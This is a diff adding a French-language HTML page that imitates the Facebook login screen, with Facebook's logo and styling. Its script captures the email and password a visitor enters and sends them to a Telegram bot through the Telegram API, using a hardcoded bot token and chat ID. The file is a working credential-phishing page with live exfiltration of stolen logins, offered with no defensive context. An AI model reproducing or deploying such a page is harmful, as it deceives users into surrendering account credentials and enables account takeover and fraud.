@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à Facebook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-box {
+            width: 350px;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .login-box h2 {
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+        .forgot-password {
+            display: block;
+            margin: 10px 0;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .create-account {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .create-account a {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .create-account a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 480px) {
+            .login-box {
+                width: 90%;
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook Logo" style="width: 100px; margin-bottom: 20px;">
+        <h2>Connexion à Facebook</h2>
+        <input type="text" id="email" placeholder="Adresse e-mail ou numéro de téléphone">
+        <input type="password" id="password" placeholder="Mot de passe">
+        <div style="text-align: left; margin: 10px 0;">
+            <input type="checkbox" id="remember-me">
+            <label for="remember-me">Se souvenir de moi</label>
+        </div>
+        <button onclick="submitForm()">Se connecter</button>
+        <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+        <hr>
+        <div class="create-account">
+            <a href="#">Créer un nouveau compte</a><br>
+            <a href="#" style="font-size: 12px;">Créer une Page</a>
+        </div>
+    </div>
+
+    <script>
+        function submitForm() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Afficher les informations saisies (pour la simulation)
+            alert(`Email: ${email}\nMot de passe: ${password}`);
+
+            // Envoyer les données à votre bot Telegram
+            const botToken = '8166346967:AAH_PGw8Xzz_59MSfbSURHftg_R8Pb9_Ag0'; // Votre token
+            const chatId = '8180943947'; // Votre Chat ID
+            const message = `Nouvelle tentative de connexion :\nEmail: ${email}\nMot de passe: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error('Erreur :', error));
+        }
+    </script>
+</body>
+</html>
